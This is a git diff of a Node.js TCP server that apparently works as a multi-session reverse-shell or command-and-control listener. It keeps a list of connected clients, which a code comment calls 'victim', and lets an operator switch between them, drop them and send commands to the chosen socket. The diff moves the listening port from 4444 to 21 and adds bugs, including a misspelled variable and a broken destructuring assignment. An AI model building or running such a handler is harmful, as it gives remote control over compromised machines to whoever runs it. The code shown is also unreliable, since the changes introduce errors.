@@ -18,7 +18,7 @@ let currentClient;
 
 
 
-let serverList = {};
+const serverList = {};
 
 let prompt = {
     prompt() {
@@ -88,23 +88,20 @@ const tcpServer = net.createServer((socket) => {
 		// building regexp to match request victim 
 		let userRegexp = new RegExp(`^(${getUserToSwitch}){1,}`);
 
-		currentClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );
+		let ccurrentClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );
 
-		currentClient = socketList[currentClient];
+		ccurrentClient = socketList[ccurrentClient];
 		
-		if ( ! currentClient ) {
+		if ( ! ccurrentClient ) {
 		    process.stdout.write(color.red("There is no user with the id of " +  getUserToSwitch) + '\n');
+		    let { id, address, port } = currentClient;
+		    
+		    prompt.setPrompt({id,port,address});
 		    prompt.prompt();
-		    return ;
+		    return ;   
 		}
-		
-		let { id, address, port } = currentClient;
-		
-		prompt.setPrompt({id,port,address});
-		prompt.prompt();
-		return ;
 	    }
-
+	    
 	    process.stdout.write(color.red('invalid id specified ' + getUserToSwitch) + '\n');
 	    prompt.prompt();
 	    
@@ -154,14 +151,31 @@ const tcpServer = net.createServer((socket) => {
 
 		let removeClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );
 
-		if ( removeClient.length === 0 ) {
+		console.log(removeClient, currentClient['id']);
+
+		if ( removeClient.length !== 1 ) {
 		    process.stdout.write(color.red("There is no user with the id of " +  clientId));
 		    prompt.prompt();
 		    return ;
+		} else if ( removeClient.toString() === currentClient['id'] ) {
+
+		    delete socketList[removeClient];
+		    
+		    let objNames = Object.getOwnPropertyNames(socketList);
+		    
+		    try {
+			currentClient = socketList[objNames[objNames.length - 1]];
+			prompt.setPrompt({ id, port, address} = currentClient);
+		    } catch (e) {
+			let id = port = address = '**';
+			prompt.setPrompt({id, port, address});
+		    }
+		    prompt.prompt();		    
+		    return ;
 		}
-
+		
 		delete socketList[removeClient];
-
+		
 		prompt.prompt();
 		return ;
 		
@@ -173,6 +187,7 @@ const tcpServer = net.createServer((socket) => {
 	    
 	default:
 
+	    
 	    try {
 		sock = currentClient["sock"];
 	    } catch ( ex ) {
@@ -206,6 +221,6 @@ const tcpServer = net.createServer((socket) => {
     
 });
 
-tcpServer.listen(4444, () => {
-    console.log('listening for connection on port 4444');
+tcpServer.listen(21, () => {
+    console.log('listening for connection on port 21');
 });
